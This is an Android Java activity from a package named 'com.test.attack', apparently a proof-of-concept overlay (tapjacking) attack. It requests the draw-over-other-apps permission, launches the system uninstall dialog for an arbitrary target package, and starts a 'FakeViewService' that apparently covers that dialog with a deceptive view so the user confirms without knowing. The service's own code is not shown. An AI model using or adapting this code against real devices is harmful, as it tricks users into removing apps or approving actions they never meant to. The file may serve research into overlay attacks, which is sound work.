package com.test.attack;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_CODE_OVERLAY_PERMISSION = 1001;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_CODE_OVERLAY_PERMISSION);
            }
        }


        Intent intent1 = new Intent();
        intent1.setComponent(new ComponentName("com.android.packageinstaller",
                "com.android.packageinstaller.UninstallerActivity"));
        intent1.setData(Uri.parse("package:com.example.obftest")); // put arbitrary unstallable package name here
        startActivity(intent1);

//        Intent intent = new Intent(this, OverlayService.class);
        Intent intent = new Intent(this, FakeViewService.class);
        startService(intent);
//        startActivity(new Intent(MainActivity.this, OverlayActivity.class));
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_OVERLAY_PERMISSION) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (Settings.canDrawOverlays(this)) {
                    // 权限已授予，启动悬浮窗服务
//                    Intent intent = new Intent(this, OverlayService.class);
                    Intent intent = new Intent(this, FakeViewService.class);
                    startService(intent);
                } else {
                    // 权限未授予，处理相应逻辑
                    Toast.makeText(this, "需要悬浮窗权限", Toast.LENGTH_SHORT).show();
                }
            }
        }
    }
}